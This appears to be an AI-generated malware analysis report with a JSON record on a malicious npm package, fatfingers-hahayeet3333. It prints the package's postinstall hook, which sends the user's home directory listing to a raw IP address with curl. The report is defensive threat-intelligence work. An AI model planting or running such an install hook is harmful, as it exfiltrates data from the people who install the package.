# npm fatfingers-hahayeet3333@1.0.1

**Source:** datadog · **Source label:** malicious · **Released:** 2025-04-04 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package has a single postinstall hook, an inline shell line that runs `ls ~` and sends the output to hxxp://50[.]116[.]2[.]44:4444 as a URL-encoded `data` query parameter via `curl -G`. There are no gates: no shell conditionals in the hook and no manifest platform restrictions, so it runs on every install wherever `curl` exists and the host is reachable. Behaviour is recon plus exfil of the home directory listing.

## Execution

- **postinstall** `curl -G --data-urlencode "data=$(ls ~)" hxxp://50[.]116[.]2[.]44:4444`: no package files; inline_shell.

## Gates

None.

## Requirements

- installed_tool: curl, ls (hook runs curl with a command substitution of ls)
- network: 50[.]116[.]2[.]44:4444 (home directory listing is sent to this host over HTTP)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- `package.json` is the only file in the package; `main` points to a missing `index.js`.
- It depends on `fatfingers-hahayeet@1.0.0` from the registry, which is out of scope here (dependency tree).
- The prefilled `download_then_exec` launch style was changed to `inline_shell`, since nothing is downloaded and run.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "fatfingers-hahayeet3333",
    "version": "1.0.1",
    "archive_sha256": "8f7b2d4eb51967c4f5d31a7041d877194403aaa473ad7a33083b2f4dc8b08bbb",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-04-04",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2025-04-10-fatfingers-hahayeet3333-v1.0.1.zip",
    "package_root": "layer0/tmp/tmpsutmmmcu/fatfingers-hahayeet3333/package",
    "cluster_key": "8c4ed0b22f8d426cf8c64754fbf6853ecfbd8b7930968fe8c6d1dded37705fee",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "postinstall",
        "command": "curl -G --data-urlencode \"data=$(ls ~)\" hxxp://50[.]116[.]2[.]44:4444",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "postinstall is a single inline shell line: it lists the home directory with ls ~ and sends the listing as a GET query parameter to a raw IP on port 4444 with curl. Nothing is fetched and run, so launch style is inline_shell, not download_then_exec.",
      "package.json: read in full; it is the only package file (main index.js is absent). No shell conditionals in the hook, no os/cpu/libc fields, so no gates.",
      "Dependency fatfingers-hahayeet@1.0.0 is a registry dependency of a similar name; its code is dependency tree and out of scope here."
    ]
  },
  "requirements": [
    {
      "axis": "installed_tool",
      "value": [
        "curl",
        "ls"
      ],
      "reason": "hook runs curl with a command substitution of ls"
    },
    {
      "axis": "network",
      "value": "50[.]116[.]2[.]44:4444",
      "reason": "home directory listing is sent to this host over HTTP"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxp://50[.]116[.]2[.]44:4444",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "malicious_new_package",
  "family_hint": null,
  "claude_assessment": "malicious",
  "assessment_reason": "The postinstall hook unconditionally sends a listing of the user's home directory to a hardcoded raw IP on port 4444. There is no legitimate purpose for this at install time.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
